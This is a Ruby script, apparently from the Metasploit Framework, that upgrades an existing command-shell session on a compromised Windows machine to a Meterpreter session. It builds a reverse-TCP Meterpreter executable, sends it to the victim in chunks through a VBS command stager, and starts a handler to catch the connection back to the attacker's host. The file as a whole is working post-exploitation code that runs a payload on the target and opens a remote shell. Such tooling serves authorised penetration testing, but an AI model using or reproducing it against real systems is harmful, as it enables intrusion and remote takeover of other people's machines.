#
# Spawn a meterpreter session using an existing command shell session
#
# NOTE: Some of the following code is duplicated from the VBS CmdStager
#
# This is really only to prove the concept for now.
#
# -jduck
#


#
# Show the progress of the upload
#
def progress(total, sent)
	done = (sent.to_f / total.to_f) * 100
	print_status("Command Stager progress - %3.2f%% done (%d/%d bytes)" % [done.to_f, sent, total])
end


raise RuntimeError, "You must select a session." if (not session)
raise RuntimeError, "Selected session is not a command shell session!" if (session.type != "shell")

# Check for required datastore options
if (not session.exploit_datastore['LHOST'] or not session.exploit_datastore['LPORT'])
	raise RuntimeError, "You must set LPORT and LHOST for this script to work."
end


lhost = session.exploit_datastore['LHOST']
lport = session.exploit_datastore['LPORT']

# maybe we want our sessions going to another instance?
use_handler = true
use_handler = nil if (session.exploit_datastore['DisablePayloadHandler'] == true)

# Process special var/val pairs...
# XXX: Not supported yet...
#Msf::Ui::Common.process_cli_arguments($framework, ARGV)


# Create the payload instance
payload_name = 'windows/meterpreter/reverse_tcp'
payload = framework.payloads.create(payload_name)
options = "LHOST=#{lhost} LPORT=#{lport}"
buf = payload.generate_simple('OptionStr' => options)

#
# Spawn the handler if needed
#
aborted = false
begin

	mh = nil
	if (use_handler)
		mh = framework.modules.create("exploit/multi/handler")
		mh.datastore['LPORT'] = lport
		mh.datastore['LHOST'] = lhost
		mh.datastore['PAYLOAD'] = payload_name
		mh.datastore['ExitOnSession'] = false
		mh.datastore['EXITFUNC'] = 'process'
		mh.exploit_simple(
			'LocalInput'     => session.user_input,
			'LocalOutput'    => session.user_output,
			'Payload'        => payload_name,
			'RunAsJob'       => true)
		# It takes a little time for the resources to get set up, so sleep for
		# a bit to make sure the exploit is fully working.  Without this,
		# mod.get_resource doesn't exist when we need it.
		select(nil, nil, nil, 0.5)
		if framework.jobs[mh.job_id.to_s].nil?
			raise RuntimeError, "Failed to start multi/handler - is it already running?"
		end
	end


	#
	# Make the payload into an exe for the CmdStager
	#
	lplat = [Msf::Platform::Windows]
	larch = [ARCH_X86]
	linemax = 1700
	if (session.exploit_datastore['LineMax'])
		linemax = session.exploit_datastore['LineMax'].to_i
	end
	opts = {
		:linemax => linemax,
		:decoder => File.join(Msf::Config.install_root, "data", "exploits", "cmdstager", "vbs_b64"),
		#:nodelete => true # keep temp files (for debugging)
	}
	exe = Msf::Util::EXE.to_executable(framework, larch, lplat, buf)


	#
	# Generate the stager command array
	#
	cmdstager = Rex::Exploitation::CmdStagerVBS.new(exe)
	cmds = cmdstager.generate(opts)
	if (cmds.nil? or cmds.length < 1)
		print_error("The command stager could not be generated")
		raise ArgumentError
	end

	#
	# Calculate the total size
	#
	total_bytes = 0
	cmds.each { |cmd| total_bytes += cmd.length }


	#
	# Run the commands one at a time
	#
	sent = 0
	cmds.each { |cmd|
		ret = session.shell_command_token_win32(cmd)
		if (not ret)
			aborted = true
		else
			ret.strip!
			if (not ret.empty?)
				aborted = true
			end
		end
		if aborted
			print_error("Error: Unable to execute the following command:")
			print_error(cmd.inspect)
			print_error('Output: ' + ret.inspect) if ret and not ret.empty?
			break
		end

		sent += cmd.length

		progress(total_bytes, sent)
	}
rescue ::Interrupt
	# TODO: cleanup partial uploads!
	aborted = true
rescue => e
	print_error("Error: #{e}")
	aborted = true
end

#
# Stop the job
#
if (use_handler)
	Thread.new do
		if not aborted
			# Wait up to 10 seconds for the session to come in..
			select(nil, nil, nil, 10)
		end
		framework.jobs.stop_job(mh.job_id)
	end
end
